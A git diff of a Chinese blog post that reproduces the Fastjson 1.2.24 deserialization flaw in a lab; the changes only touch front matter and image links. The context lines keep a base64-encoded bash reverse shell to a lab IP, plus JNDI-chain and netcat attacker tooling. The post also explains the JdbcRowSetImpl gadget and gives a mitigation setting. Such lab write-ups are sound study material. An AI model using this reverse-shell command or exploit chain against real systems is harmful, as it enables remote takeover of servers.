@@ -1,7 +1,8 @@
 ---
-title: Fastjson反序列化漏洞（1.2.24版本）
+title: "Fastjson反序列化漏洞（1.2.24版本）"
 slug: fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben
 cover: ""
+date: 2026-01-09
 categories:
   - 漏洞复现
 tags:
@@ -64,7 +65,7 @@ url相当于type类里面执行了setUrl("xxx"),会改变类里面的值
    docker-compose up -d
 ```
 访问：http://靶机IP:8090
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229201244.png)
+![[Pasted image 20251229201244.png]]
 2. **攻击机环境**：
     - Java-Chains（用于生成 JNDI 利用链）
     - nc/netcat（用于监听反弹 shell）
@@ -82,8 +83,8 @@ post发送
     }
 }
 ```
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229202025.png)
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229201902.png)
+![[Pasted image 20251229202025.png]]
+![[Pasted image 20251229201902.png]]
 
 - 尝试命令执行反弹shell
 ```shell
@@ -91,7 +92,7 @@ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMi4xNjcuMTY0LzQ0NDQgMD4mMQ==" | base64 -d 
 ```
 
 成功反弹
-![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted%20image%2020251229202325.png)
+![[Pasted image 20251229202325.png]]
 
 原理:
 通过fastjson反序列化,加载类com.sun.rowset.JdbcRowSetImpl,这个类是jdbc的数据库驱动类先将autoCommit赋值为true,说明开启自动连接,就是在类进行初始化的时候自动连接
@@ -160,4 +161,3 @@ config.setAutoTypeSupport(false);
 
 # JDK 6u132, 7u122, 8u113 及以上版本默认已设置
 ```
-
